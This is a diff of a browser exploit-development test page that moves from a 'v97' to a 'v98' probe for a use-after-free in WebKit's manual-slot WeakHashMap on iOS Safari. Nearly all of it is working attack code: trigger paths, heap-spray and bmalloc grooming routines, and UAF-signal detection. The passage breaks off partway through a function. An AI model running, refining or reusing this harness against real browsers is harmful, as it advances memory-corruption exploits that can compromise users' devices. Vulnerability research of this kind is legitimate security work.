@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SlotAssignment UAF v97</title>
+<title>ManualSlot UAF v98</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { background:#0d0d0d; color:#00ff41; font-family:'Courier New',monospace; padding:16px; min-height:100vh; }
@@ -15,86 +15,82 @@ h2   { color:#ff4141; margin-bottom:2px; font-size:11px; }
 .dim { color:#555; }
 .hi  { color:#00cfff; }
 .hit { color:#ff41ff; font-weight:bold; }
-.sec { color:#ff8c00; font-weight:bold; }
 #ctrl{ display:flex; gap:6px; margin:8px 0; flex-wrap:wrap; }
 button { background:#1a1a1a; border:1px solid #333; color:#00ff41; padding:6px 12px; cursor:pointer; font-family:monospace; font-size:11px; border-radius:2px; }
 button:disabled { opacity:.4; }
 button.red   { border-color:#ff4141; color:#ff4141; }
 button.purple{ border-color:#ff41ff; color:#ff41ff; }
-button.yellow{ border-color:#ffcc00; color:#ffcc00; }
+button.copy-done { border-color:#00ff41; color:#00ff41; animation: pulse 0.6s ease 3; }
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
 #rig-area { position:fixed; top:0; left:0; width:200px; height:200px; overflow:visible; pointer-events:none; opacity:0.01; }
 </style>
 </head>
 <body>
 
-<h2>SlotAssignment UAF v97 · SlotAssignmentData Reclaim + Crash Path · rdar://174493428 · iOS 26.5.2</h2>
+<h2>ManualSlot UAF v98 · rdar://179729192 · WeakHashMap shrink-rehash · iOS 26.5.2</h2>
 
 <div class="warn">
 ▶ OPEN DIRECTLY IN SAFARI on device.<br>
 <br>
-v96 FINDING: sc=×1 but sc-spray-NOT-BUILT. Root cause confirmed:<br>
-slotchange is a MICROTASK — fires AFTER sync C++ returns. The freed old<br>
-bucket gets reclaimed synchronously by the rehash's own new-bucket alloc.<br>
-JS spray cannot interpose on a sync free+reuse.<br>
+rdar://179729192: ManualSlot WeakHashMap UAF during shrink-rehash.<br>
 <br>
-v97 NEW APPROACH — FREEING SlotAssignmentData FIRST:<br>
+CONTEXT:<br>
+  ShadowRoot in manual-slot mode maintains a WeakHashMap:<br>
+  m_manuallyAssignedSlotsForElementOrText : WeakHashMap&lt;Node, HTMLSlotElement&gt;<br>
+  Maps: assigned node → the slot it was assigned to<br>
+  Modified by: slot.assign(nodes) — each node added or removed updates this map<br>
 <br>
-The UAF reads the freed BUCKET ARRAY to get SlotAssignmentData*,<br>
-then WRITES to the SlotAssignmentData object (which is still live).<br>
-We can't intercept the bucket-array read (sync). But we CAN intercept<br>
-the SlotAssignmentData WRITES if we free the SlotAssignmentData<br>
-itself before the trigger and reclaim it with our spray.<br>
+BUG TRIGGER — SHRINK PATH:<br>
+  WTF::WeakHashMap (wraps WTF::HashTable) shrinks when:<br>
+    live keyCount &lt; tableSize / 8   (12.5% load threshold)<br>
+  Example: add 16 nodes → capacity=32, then remove 14 → live=2 → 2/32=6.25% → shrink<br>
+  During shrink: old bucket array freed, new smaller array allocated<br>
+  If any iterator/reference holds a ptr into old array during this → UAF<br>
 <br>
-ATTACK A — SlotAssignmentData pre-free + reclaim:<br>
-  1. Create shadow root, add named slot 'primary', assign nodes → SlotAssignmentData alloc'd<br>
-  2. REMOVE the slot from shadow root → SlotAssignmentData freed<br>
-     (HashMap entry removed, SlotAssignmentData released)<br>
-  3. Spray objects same size as SlotAssignmentData → reclaim freed memory<br>
-  4. Re-add slot, re-assign → SlotAssignmentData alloc'd at NEW addr (not our spray)<br>
-  5. Trigger UAF → writes to NEW SlotAssignmentData → spray objects unaffected<br>
-  — PROBLEM: Re-adding slot gets a NEW SlotAssignmentData, not the old one.<br>
-     Our spray may occupy the old SlotAssignmentData addr but UAF won't write there.<br>
+TWO TRIGGER PATHS:<br>
+  PATH A — slot.assign([]) direct removal:<br>
+    1. slot.assign([n1,n2,...,n16]) → WeakHashMap grows to cap=32<br>
+    2. slot.assign([n1]) → removes n2..n16 → live=1 → 1/32=3% → shrink<br>
+    3. If WebKit is iterating the map during slot.assign() removal → UAF<br>
 <br>
-ATTACK B — USE THE EXISTING assignedNodes AS RECLAIM TARGET:<br>
-The UAF zeroes slot->assignedNodes.m_data (a Vector&lt;WeakPtr&gt; internal buffer).<br>
-If the Vector had grown + reallocated its buffer, the OLD buffer is freed.<br>
-We spray at the OLD buffer size → reclaim it → UAF writes to our object? No,<br>
-the UAF writes to the NEW buffer (m_data points to current buffer).<br>
+  PATH B — DOM removal (weak key GC):<br>
+    1. slot.assign([n1,...,n32]) → WeakHashMap grows to cap=64<br>
+    2. Remove n2..n28 from DOM → WeakPtrs become null → dead keys in map<br>
+    3. WeakHashMap::removeDeadKeysIfNeeded() → removes dead entries<br>
+    4. If live &lt; tableSize/8 after cleanup → shrink → rehash → UAF<br>
 <br>
-ATTACK C — CRASH PATH (NULL-DEREF):<br>
-bmalloc on iOS normally does NOT zero freed chunks immediately.<br>
-But under GC pressure or certain allocation patterns, the 'decommit' path<br>
-zeroes pages returned to the OS. If old bucket page gets decommitted:<br>
-  *slot = 0 (reading offset 0 of freed+zeroed 128B chunk)<br>
-  slot->assignedNodes → nullptr->assignedNodes → crash at 0x0+8 or 0x0+0<br>
-We can stress-test the decommit path by:<br>
-  a) Creating many rigs to exhaust bmalloc's per-class cache<br>
-  b) Triggering large allocations between free and UAF read<br>
-  c) Using madvise-pressure via many large ArrayBuffer allocs+frees<br>
+  PATH C — CROSS-ASSIGN (key path for UAF):<br>
+    The UAF in this bug likely occurs during resolveSlotsAfterSlotMutation<br>
+    on a MANUAL shadow root. When iterating m_manuallyAssignedSlotsForElementOrText<br>
+    and one iteration changes the map (reassignment) causing rehash.<br>
+    The iterator holds a ref into the old bucket → dangling after rehash.<br>
+    Trigger: two slots in same shadow root, slot A assigns node, slot B assigns<br>
+    same node (forced reassignment during resolution) → one assignment clears<br>
+    slot A's entry and adds to slot B → if map grows/shrinks → UAF.<br>
 <br>
-ATTACK D — TIMING WINDOW: ASYNC TRIGGER<br>
-What if we trigger the rehash NOT via insertBefore (sync) but via<br>
-a DIFFERENT path that defers the slot-assignment resolution?<br>
-WebKit slot assignment resolves lazily — if we force a layout AFTER<br>
-queuing many DOM mutations, the resolver may run once per microtask.<br>
-Between mutations and resolution: JS runs → we spray → THEN resolution reads.<br>
+SIGNAL DETECTION:<br>
+  Unlike NamedSlot UAF, ManualSlot UAF might CRASH (null-deref) rather than<br>
+  silently write, if the iterator reads a zeroed freed chunk.<br>
+  Detection: try/catch around trigger. THREW = UAF crash = confirmed.<br>
+  Also: check assignedElements() before/after for unexpected state changes.<br>
 <br>
-v97 TESTS:<br>
-  A) SC-TIMING: confirm slotchange fires POST-uaf vs PRE-uaf (fixed detection)<br>
-  B) CRASH-PRESSURE: exhaust bmalloc class-128 cache → try null-deref crash path<br>
-  C) ASYNC-TRIGGER: trigger slot assignment via lazy resolution path<br>
-  D) SLOTASSIGNMENTDATA-SIZE: find exact SlotAssignmentData size via allocator groom<br>
-  E) LOOP ×200: stress with crash-pressure method
+KEY MATH for shrink threshold:<br>
+  tableSize=8: shrinks when live &lt; 1 (removing all entries from size-8 map)<br>
+  tableSize=16: shrinks when live &lt; 2<br>
+  tableSize=32: shrinks when live &lt; 4<br>
+  tableSize=64: shrinks when live &lt; 8<br>
+  tableSize=128: shrinks when live &lt; 16<br>
+  → Best target: grow to cap=64 (need 9+ nodes), remove all but 7 → 7/64=11% → shrink<br>
 </div>
 
 <div id="ctrl">
-  <button id="bSCT"  onclick="runSCTiming()"       class="red">A: SC-TIMING</button>
-  <button id="bCrash" onclick="runCrashPressure()" class="red">B: CRASH-PRESSURE</button>
-  <button id="bAsync" onclick="runAsyncTrigger()"  class="yellow">C: ASYNC-TRIGGER</button>
-  <button id="bSAD"  onclick="runSADSize()"        class="yellow">D: SAD-SIZE</button>
-  <button id="bLoop" onclick="runLoop()"            class="red">E: LOOP ×200</button>
-  <button id="bAll"  onclick="runAll()"             class="purple">RUN ALL</button>
-  <button onclick="copyLog()">COPY</button>
+  <button id="bA"   onclick="runPathA()" class="red">PATH-A: direct</button>
+  <button id="bB"   onclick="runPathB()" class="red">PATH-B: DOM-GC</button>
+  <button id="bC"   onclick="runPathC()" class="red">PATH-C: cross-assign</button>
+  <button id="bD"   onclick="runPathD()" class="red">PATH-D: grow+shrink sweep</button>
+  <button id="bL"   onclick="runLoop()"  class="red">LOOP ×200</button>
+  <button id="bAll" onclick="runAll()"   class="purple">RUN ALL</button>
+  <button id="bCopy" onclick="copyLog()">COPY LOG</button>
   <button onclick="L.innerHTML=''">CLR</button>
 </div>
 <div id="log"></div>
@@ -104,8 +100,9 @@ v97 TESTS:<br>
 'use strict';
 const RIG  = document.querySelector('#rig-area');
 const L    = document.getElementById('log');
-const BTNS = ['bSCT','bCrash','bAsync','bSAD','bLoop','bAll'];
+const BTNS = ['bA','bB','bC','bD','bL','bAll'];
 let uafTotal = 0;
+let _inRunAll = false;
 
 function log(msg, cls){
   const s = document.createElement('span');
@@ -118,575 +115,567 @@ function copyLog(){
   t.value=L.innerText; t.style.cssText='position:fixed;opacity:0';
   document.body.appendChild(t); t.select(); document.execCommand('copy');
   document.body.removeChild(t);
+  const b=document.getElementById('bCopy');
+  b.textContent='COPIED ✓'; b.classList.add('copy-done');
+  setTimeout(()=>{ b.textContent='COPY LOG'; b.classList.remove('copy-done'); },2000);
 }
 function dis(v){ BTNS.forEach(id=>{ const b=document.getElementById(id); if(b) b.disabled=v; }); }
 function noteUAF(tag){ uafTotal++; log(`  !!UAF-SIGNAL!! [${tag}] total=${uafTotal}`, 'hit'); }
-
-function raf(){ return new Promise(r=>requestAnimationFrame(r)); }
-function tick(){ return new Promise(r=>setTimeout(r,0)); }
 function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
-function gcPressure(n){
-  // Allocate+release large ArrayBuffers to pressure bmalloc decommit path
-  const bufs = [];
-  for(let i=0;i<n;i++) bufs.push(new ArrayBuffer(64*1024));
-  bufs.length = 0; // release
-}
+function tick(){ return new Promise(r=>setTimeout(r,0)); }
+function raf(){ return new Promise(r=>requestAnimationFrame(r)); }
 
-function makeRig(pfx, numUnique, prePopulate){
+// ─────────────────────────────────────────────────────────────────────────────
+// MAKE MANUAL RIG
+// Returns a manual-slot shadow root with one slot and N assignable children
+// ─────────────────────────────────────────────────────────────────────────────
+function makeManualRig(pfx, numChildren){
   const host = document.createElement('div');
-  host.style.cssText='display:block;width:80px;height:40px;';
-  const sr = host.attachShadow({mode:'open'});
-  const slot1 = document.createElement('slot'); slot1.name='primary';
-  const slot2 = document.createElement('slot'); slot2.name='primary';
-  const slotDef = document.createElement('slot');
-  sr.appendChild(slot1); sr.appendChild(slot2); sr.appendChild(slotDef);
-  const primaryChild = document.createElement('span');
-  primaryChild.slot = 'primary'; primaryChild.textContent = 'P';
-  host.appendChild(primaryChild);
-  for(let i=0; i<numUnique; i++){
+  host.style.cssText = 'display:block;width:80px;height:20px;';
+  // Manual slot assignment mode — KEY: slotAssignment:'manual'
+  let sr;
+  try {
+    sr = host.attachShadow({ mode:'open', slotAssignment:'manual' });
+  } catch(e){
+    // Safari might not support slotAssignment:'manual' or it might throw
+    log(`  !! attachShadow({slotAssignment:'manual'}) THREW: ${e.message}`, 'bad');
+    return null;
+  }
+  const slot = document.createElement('slot');
+  sr.appendChild(slot);
+  const children = [];
+  for(let i=0; i<numChildren; i++){
     const n = document.createElement('span');
-    n.slot = `${pfx}-u${i}`;
+    n.textContent = `c${pfx}${i}`;
     host.appendChild(n);
+    children.push(n);
   }
   RIG.appendChild(host);
   void host.getBoundingClientRect();
-  let preLen = 0;
-  if(prePopulate) preLen = slot1.assignedNodes().length;
-  return { host, sr, slot1, slot2, slotDef, primaryChild, pfx, numUnique, preLen };
+  return { host, sr, slot, children, pfx };
+}
+
+// Helper: assign a set of children to the slot
+function assignNodes(slot, nodes){
+  try {
+    slot.assign(nodes);
+  } catch(e){
+    noteUAF(`assign-threw:${e.message.substring(0,40)}`);
+    return false;
+  }
+  return true;
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// A: SC-TIMING — FIXED DETECTION
-// Move checkSet INSIDE setTimeout, after microtask has fired.
+// PATH A: Direct shrink via slot.assign() removal
+//
+// Theory: slot.assign([N nodes]) grows WeakHashMap to capacity C.
+//         slot.assign([few nodes]) removes most → live < C/8 → shrink → UAF.
+//
+// The UAF during shrink would occur IF WebKit holds a reference into the
+// WeakHashMap while slot.assign() is modifying it.
+// In practice: slot.assign() may iterate the current assignment list while
+// updating — if it does, the shrink during iteration causes dangling ref.
 // ─────────────────────────────────────────────────────────────────────────────
+async function probePathA(label, numFill, keepCount){
+  const rig = makeManualRig(label, numFill + 10); // extra children
+  if(!rig) return { sig:'NO-MANUAL-SLOT-SUPPORT', hit:false };
 
-function probeSCTimingFixed(label, numUnique, charLen){
-  return new Promise(resolve => {
-    const rig = makeRig(label, numUnique, true);
-    let scFired = 0;
-    let scPhase = '?'; // 'before-trigger' | 'after-trigger-sync' | 'after-trigger-microtask'
-    let callbackSpray = [];
-    let corruptInSC = 0;
-    const triggerSent = {};
-    let triggerDone = false;
+  const sigs = [];
+  let threw = false, threwMsg = '';
 
-    rig.slot1.addEventListener('slotchange', () => {
-      scFired++;
-      scPhase = triggerDone ? 'after-trigger-microtask' : 'during-trigger-sync';
-      // Build spray inside SC handler (runs as microtask, AFTER C++ unwinds)
-      callbackSpray = [];
-      const frag = document.createDocumentFragment();
-      const base = 'X'.repeat(charLen);
-      for(let i=0; i<32; i++){
-        const el = document.createElement('span');
-        el.textContent = base + String(i).padStart(4,'0');
-        callbackSpray.push(el);
-        frag.appendChild(el);
-      }
-      RIG.appendChild(frag);
-      void RIG.getBoundingClientRect();
-    });
+  // Step 1: fill WeakHashMap
+  if(!assignNodes(rig.slot, rig.children.slice(0, numFill))){
+    sigs.push('fill-assign-threw');
+    threw = true;
+  }
+  void rig.host.getBoundingClientRect();
 
-    // TRIGGER
+  // Check pre-assignment
+  let preLen = -1;
+  try { preLen = rig.slot.assignedElements().length; } catch(e){ preLen=-999; }
+  sigs.push(`pre=${preLen}`);
+
+  if(!threw){
+    // Step 2: shrink — assign only keepCount nodes
+    // This removes (numFill - keepCount) entries
+    // If numFill/tableSize > 1/8 before → live = keepCount
+    // If keepCount < tableSize/8 → shrink triggered
     try {
-      const s3 = document.createElement('slot'); s3.name='primary';
-      rig.sr.insertBefore(s3, rig.slot1);
-      void rig.host.getBoundingClientRect();
-    } catch(e){ noteUAF(`${label}-trig-threw`); }
-    triggerDone = true;
+      rig.slot.assign(rig.children.slice(0, keepCount));
+    } catch(e){
+      threw = true; threwMsg = e.message;
+      noteUAF(`${label}-shrink-assign-threw:${e.message.substring(0,60)}`);
+    }
+    void rig.host.getBoundingClientRect();
+  }
 
-    // setTimeout fires AFTER microtasks (including slotchange) have drained
+  return new Promise(resolve => {
     setTimeout(() => {
       let postLen = -1;
-      try { postLen = rig.slot1.assignedNodes().length; }
-      catch(e){ postLen=-999; noteUAF(`${label}-post-threw`); }
+      try { postLen = rig.slot.assignedElements().length; } catch(e){ postLen=-999; threw=true; }
+      sigs.push(`post=${postLen}`);
+      if(threw) sigs.push(`THREW:${threwMsg.substring(0,40)}`);
 
-      let scResult = null;
-      if(callbackSpray.length > 0){
-        const expected = charLen + 4;
-        let ok=0, corrupt=0, threw=0;
-        const corruptIdx = [];
-        for(let i=0; i<callbackSpray.length; i++){
-          try {
-            const t = callbackSpray[i].textContent;
-            if(t && t.length===expected && t[0]==='X') ok++;
-            else { corrupt++; corruptIdx.push(i); }
-          } catch(e){ threw++; corruptIdx.push(i); noteUAF(`${label}-sc-threw`); }
-        }
-        scResult = { ok, corrupt, threw, corruptIdx };
-        if(corrupt>0||threw>0) noteUAF(`${label}-sc-corrupt:${corrupt}+threw:${threw}`);
-      }
+      try { RIG.removeChild(rig.host); } catch(_){}
 
-      // Cleanup
-      if(callbackSpray.length) {
-        for(const el of callbackSpray){ if(el.parentNode) el.parentNode.removeChild(el); }
-      }
-      try{ RIG.removeChild(rig.host); }catch(_){}
+      const anyHit = threw || postLen === -999 ||
+                     (postLen !== keepCount && postLen !== -1);
+      if(anyHit && !threw) noteUAF(`${label}-stateCorrupt:post=${postLen}!=keep=${keepCount}`);
 
-      const sig = [
-        `pre=${rig.preLen}`,
-        `sc=×${scFired}`,
-        `sc-phase=${scPhase}`,
-        postLen===0?'post=0(zeroed)':postLen===-999?'post=THREW':`post=${postLen}`,
-        scResult?
-          (scResult.corrupt>0||scResult.threw>0)?
-            `SC-CORRUPT:${scResult.corrupt}+T:${scResult.threw}`:
-            `sc-ok(${scResult.ok})`
-          :'sc-spray-empty'
-      ].join(' | ');
-
-      const hit = (scResult&&(scResult.corrupt>0||scResult.threw>0))||postLen===-999;
-      resolve({ sig, hit, scFired, scPhase, scResult, postLen });
-    }, 100);
+      const sig = `[${label}] fill=${numFill}→keep=${keepCount} | ${sigs.join(' | ')}`;
+      resolve({ sig, hit: anyHit, threw, postLen });
+    }, 80);
   });
 }
 
-async function runSCTiming(){
-  dis(true); uafTotal=0; L.innerHTML='';
+async function runPathA(){
+  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  A: SC-TIMING · fixed detection (check in setTimeout)        ║','hi');
+  log('║  PATH-A: direct shrink via slot.assign() removal             ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('');
-  log('  v96 BUG: checked callbackSpray BEFORE microtask fired.','inf');
-  log('  v97 FIX: check inside setTimeout (runs after microtasks drain).','inf');
-  log('  slotchange is a microtask → fires AFTER sync C++ → AFTER UAF.','inf');
-  log('  sc-phase should be "after-trigger-microtask" on all configs.','inf');
-  log('  If spray is ever corrupt → UAF write landed on post-trigger alloc.','inf');
-  log('');
 
+  // tableSize thresholds:
+  // Grow to cap after filling N > cap/2 entries (HashMap grows when load > 50%)
+  // So to get cap=32 (shrink at <4 live): need to fill >16 → then keep <4
+  // To get cap=64 (shrink at <8 live): fill >32 → keep <8
   const configs = [
-    {nu:4, charLen:48,  label:'u4c48'},
-    {nu:8, charLen:112, label:'u8c112'},
-    {nu:3, charLen:16,  label:'u3c16'},
+    // fill=1 → cap=2 → shrink at live<1 → keep=0
+    { label:'A01', fill:1,  keep:0 },
+    // fill=5 → cap=8 → shrink at live<1 → keep=0
+    { label:'A05-k0', fill:5, keep:0 },
+    // fill=5 → cap=8 → shrink at live<1 → keep=1 (no shrink)
+    { label:'A05-k1', fill:5, keep:1 },
+    // fill=9 → cap=16 → shrink at live<2 → keep=1
+    { label:'A09-k1', fill:9, keep:1 },
+    // fill=9 → cap=16 → shrink at live<2 → keep=0
+    { label:'A09-k0', fill:9, keep:0 },
+    // fill=17 → cap=32 → shrink at live<4 → keep=3
+    { label:'A17-k3', fill:17, keep:3 },
+    // fill=17 → cap=32 → shrink at live<4 → keep=0
+    { label:'A17-k0', fill:17, keep:0 },
+    // fill=33 → cap=64 → shrink at live<8 → keep=7
+    { label:'A33-k7', fill:33, keep:7 },
+    // fill=33 → cap=64 → shrink at live<8 → keep=0
+    { label:'A33-k0', fill:33, keep:0 },
+    // fill=65 → cap=128 → shrink at live<16 → keep=15
+    { label:'A65-k15', fill:65, keep:15 },
+    // fill=65 → cap=128 → shrink at live<16 → keep=0
+    { label:'A65-k0', fill:65, keep:0 },
   ];
 
   const sums = [];
   for(const c of configs){
-    log(`── ${c.label} ──`,'dim');
-    const r = await probeSCTimingFixed(c.label, c.nu, c.charLen);
-    log(`  [${c.label}] ${r.sig}`, r.hit?'hit':'ok');
+    const r = await probePathA(c.label, c.fill, c.keep);
+    log(`  ${r.sig}`, r.hit?'hit':'ok');
     sums.push(r);
-    await delay(30);
+    await delay(20);
   }
 
   log('');
-  log('── PHASE VERDICT ──','hi');
-  for(const r of sums){
-    const phase = r.scPhase;
-    if(phase==='after-trigger-microtask') log(`  ${phase} → CONFIRMED: slotchange fires POST-UAF (microtask)`, 'ok');
-    else if(phase==='during-trigger-sync') log(`  ${phase} → UNEXPECTED: slotchange fires during sync C++!`, 'hit');
-    else log(`  ${phase} → no signal`, 'inf');
+  log('  Signals:', 'hi');
+  const hits = sums.filter(r=>r.hit);
+  if(hits.length){
+    for(const r of hits) log(`  !! ${r.sig}`, 'hit');
+  } else {
+    log('  0 signals — PATH A: no shrink-triggered UAF via direct removal', 'inf');
+    log('  Possible: shrink does not cause UAF in this code path (no concurrent iter)', 'dim');
   }
-  log('');
-  log('  IMPLICATION: The freed bucket (old HashMap buckets) is uncatchable from JS.','inf');
-  log('  The UAF read of freed bucket happens IN sync C++, before any JS runs.','inf');
-  log('  slotchange spray (post-UAF) cannot intercept the bucket-read path.','inf');
   dis(false);
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// B: CRASH-PRESSURE
-// Goal: Get bmalloc to zero/decommit the freed 128B bucket chunk before the UAF
-// reads it. If zeroed: *slot=0 → slot->assignedNodes crash at null+offset.
+// PATH B: DOM removal → weak key GC → removeDeadKeysIfNeeded → shrink
 //
-// Method: Create many rigs simultaneously so the 128B bmalloc page gets
-// filled with live objects. When ONE bucket is freed, bmalloc might decommit
-// the page containing it (returns to OS as zeroed) if it's the last live
-// object on that page (bmalloc page = 16KB, holds 128 × 128B chunks).
+// This is the GC-triggered path. When WeakPtr keys die (nodes removed from DOM),
+// the WeakHashMap accumulates dead entries. On the next access to the map,
+// removeDeadKeysIfNeeded() runs and:
+//   1. Removes dead entries (decrements live count)
+//   2. If live < tableSize/8 → shrink()
+//   3. shrink() allocates new smaller bucket array, copies live entries, frees old
+//   4. If anything is still iterating → dangling ref → UAF
 //
-// To get a page with only ONE live 128B chunk:
-// 1. Allocate ~150 × 128B objects (fill 1 full 16KB page = 128 chunks, plus some)
-// 2. Free all BUT ONE → that page now has 127 free slots, 1 live
-// 3. bmalloc should decommit the page (zero it) → our one live chunk slot is zeroed
-// 4. But our live chunk is a HashMap bucket that we want to UAF-read
-// → If the page was decommitted, reading offset 0 of that chunk = 0
-// → The UAF reads 0 as SlotAssignmentData* → slot->assignedNodes = crash at 0+0
-//
-// Creating HashMap bucket objects from JS:
-// Each slot with numUnique=4 → capacity=8 → 8 buckets × 16B = 128B array.
-// So EACH RIG creates ONE 128B HashMap bucket array.
-// We create ~200 rigs, trigger ALL of them (freeing most bucket arrays),
-// then trigger the LAST rig → its 128B bucket is freed on a nearly-empty page.
+// The "removeDeadKeysIfNeeded" is called at the START of most map operations.
+// So: fill map → remove nodes from DOM → access map → triggers cleanup → shrink.
+// During the cleanup-triggered shrink, are there concurrent iterators? YES:
+//   resolveSlotsAfterSlotMutation iterates m_manuallyAssignedSlotsForElementOrText
+//   while resolving slot assignments. If during iteration a dead-key cleanup
+//   triggers shrink, the iterator is invalidated.
 // ─────────────────────────────────────────────────────────────────────────────
+async function probePathB(label, numFill, numRemove, accessMethod){
+  const rig = makeManualRig(label, numFill + 5);
+  if(!rig) return { sig:'NO-MANUAL-SLOT-SUPPORT', hit:false };
 
-let crashCount = 0;
-
-async function runCrashPressure(){
-  dis(true); uafTotal=0; L.innerHTML='';
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  B: CRASH-PRESSURE · bmalloc decommit → null-deref path      ║','hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-  log('  Goal: exhaust bmalloc 128B class → page with 1 live chunk','inf');
-  log('  → bmalloc decommits → chunk zeroed → *slot=0 → crash at null','inf');
-  log('');
-
-  const PRESOAK_COUNT = 160; // fill 1.25 × 16KB page of 128B chunks
-  const rigs = [];
-
-  log('  [1/4] pre-soak: creating '+PRESOAK_COUNT+' rigs (each = 1× 128B bucket)...','dim');
-  for(let i=0; i<PRESOAK_COUNT; i++){
-    rigs.push(makeRig(`cs${i}`, 4, true));
-  }
-  void RIG.getBoundingClientRect();
-  log('  [1/4] done. '+PRESOAK_COUNT+' × 128B HashMap buckets allocated.','ok');
-  await tick();
-
-  log('  [2/4] trigger first '+( PRESOAK_COUNT-1)+' rigs → free their 128B buckets...','dim');
-  let triggered = 0;
-  for(let i=0; i<PRESOAK_COUNT-1; i++){
-    const rig = rigs[i];
-    try {
-      const s3 = document.createElement('slot'); s3.name='primary';
-      rig.sr.insertBefore(s3, rig.slot1);
-    } catch(e){}
-    triggered++;
-  }
-  void RIG.getBoundingClientRect();
-  log(`  [2/4] done. ${triggered} buckets freed. 1 still live.`,'ok');
-  await tick();
-
-  log('  [3/4] GC pressure: allocate+release large buffers...','dim');
-  gcPressure(512); // 512 × 64KB = 32MB allocation pressure
-  await tick();
-  void RIG.getBoundingClientRect();
-  log('  [3/4] done.','ok');
-
-  log('  [4/4] trigger FINAL rig → its bucket is (hopefully) on decommitted page...','dim');
-  log('  IF crash: page will reload / Safari will crash → that IS the UAF signal','inf');
-  log('  IF no crash: post=0 again → bucket was NOT decommitted','dim');
-  log('  LOADING TRIGGER IN 1s...','sec');
-  await delay(1000);
-
-  const lastRig = rigs[PRESOAK_COUNT - 1];
-  let postLen = -2;
-  let threw = false;
-  try {
-    const s3 = document.createElement('slot'); s3.name='primary';
-    lastRig.sr.insertBefore(s3, lastRig.slot1);
-    void lastRig.host.getBoundingClientRect();
-    try { postLen = lastRig.slot1.assignedNodes().length; }
-    catch(e){ postLen=-999; threw=true; noteUAF('crash-pressure-post-threw'); }
-  } catch(e){ threw=true; noteUAF('crash-pressure-trigger-threw:'+e.message); }
-
-  log('');
-  const outcome = threw?'THREW(crash-path!)':postLen===0?'post=0(zeroed-but-no-crash)':'post='+postLen;
-  log(`  RESULT: ${outcome}`, threw?'hit':'ok');
-  if(!threw && postLen===0){
-    log('  bucket was NOT decommitted: bmalloc preserved value → live write to SlotAssignmentData','inf');
-    log('  Need higher pressure or different page occupancy to trigger decommit path','inf');
-  }
-  if(threw){
-    log('  CRASH PATH CONFIRMED: *slot=0 → null-deref → crash','hit');
-    log('  This is the UAF crash primitive for rdar://174493428','hit');
-  }
-
-  // Cleanup
-  for(const rig of rigs){
+  // Fill the WeakHashMap with numFill entries
+  if(!assignNodes(rig.slot, rig.children.slice(0, numFill))){
     try{ RIG.removeChild(rig.host); }catch(_){}
+    return { sig:`${label}-fill-threw`, hit:false };
   }
-  dis(false);
+  void rig.host.getBoundingClientRect();
+
+  const sigs = [`fill=${numFill}`];
+  let preLen=-1;
+  try{ preLen = rig.slot.assignedElements().length; }catch(e){ preLen=-999; }
+  sigs.push(`pre=${preLen}`);
+
+  // Remove numRemove children from DOM → their WeakPtrs become null
+  const removed = [];
+  for(let i=1; i<=numRemove && i<rig.children.length; i++){
+    const n = rig.children[i];
+    if(n.parentNode) n.parentNode.removeChild(n);
+    removed.push(n);
+  }
+  // Don't force layout yet — keep WeakPtrs as dead-but-not-cleaned
+
+  sigs.push(`removed=${removed.length}`);
+
+  // GC opportunity: encourage WeakPtr cleanup
+  // On iOS/Safari, GC is incremental. Forcing layout may trigger some GC work.
+  void rig.host.getBoundingClientRect();
+  await tick(); // yield to event loop — allow GC microtasks
+
+  let threw = false, threwMsg = '';
+
+  // ACCESS THE MAP to trigger removeDeadKeysIfNeeded → shrink
+  // Method 1: assignedElements() — reads current assignments, triggers cleanup
+  // Method 2: slot.assign([]) — clears map, triggers cleanup before clearing
+  // Method 3: add a new child's slot → triggers resolveSlotsAfterSlotMutation
+  //           which iterates the map while cleanup runs → potential UAF
+  try {
+    switch(accessMethod){
+      case 'read':
+        // Just reading — triggers dead-key cleanup
+        void rig.slot.assignedElements();
+        break;
+      case 'assign-new':
+        // Re-assign with a new child → may trigger shrink during internal iteration
+        if(rig.children[0].parentNode === rig.host){
+          rig.slot.assign([rig.children[0]]);
+        }
+        break;
+      case 'assign-empty':
+        // Assign empty → triggers full removal → shrink
+        rig.slot.assign([]);
+        break;
+      case 'force-resolution':
+        // Force slot assignment resolution by reading from DOM
+        void rig.host.getBoundingClientRect();
+        void rig.slot.assignedElements();
+        break;
+    }
+  } catch(e){
+    threw = true; threwMsg = e.message;
+    noteUAF(`${label}-access-threw:${e.message.substring(0,60)}`);
+  }
+  void rig.host.getBoundingClientRect();
+
+  return new Promise(resolve => {
+    setTimeout(() => {
+      let postLen = -1;
+      try{ postLen = rig.slot.assignedElements().length; }
+      catch(e){ postLen=-999; threw=true; noteUAF(`${label}-post-threw`); }
+      sigs.push(`post=${postLen}`);
+      if(threw) sigs.push(`THREW:${threwMsg.substring(0,50)}`);
+
+      try{ RIG.removeChild(rig.host); }catch(_){}
+
+      const anyHit = threw || postLen===-999;
+      const sig = `[${label}] method=${accessMethod} | ${sigs.join(' | ')}`;
+      resolve({ sig, hit: anyHit, threw, postLen });
+    }, 100);
+  });
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// C: ASYNC-TRIGGER
-// Can we force slot assignment to resolve LAZILY (in a separate microtask)
-// rather than synchronously, creating a window for JS to run between:
-//   (a) the moment slot assignment is SCHEDULED (we can spray here)
-//   (b) the moment slot assignment READS the freed bucket
-//
-// WebKit slot assignment resolution triggers on:
-//   - assignedNodes() / assignedElements() — synchronous
-//   - Layout/render — usually synchronous within the same frame
-//   - But: if we add children WITHOUT forcing layout, does it stay lazy?
-//
-// Test: make DOM mutations that SHOULD trigger slot assignment,
-// but DELAY layout force → spray between mutation and layout.
-// Then force layout → slot assignment resolves → UAF → reads our spray.
-//
-// The key question: does WebKit ever defer bucket-reads to a separate task?
-// ─────────────────────────────────────────────────────────────────────────────
-
-async function runAsyncTrigger(){
-  dis(true); uafTotal=0; L.innerHTML='';
+async function runPathB(){
+  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('╔══════════════════════════════════════════════════════════════╗','hi');
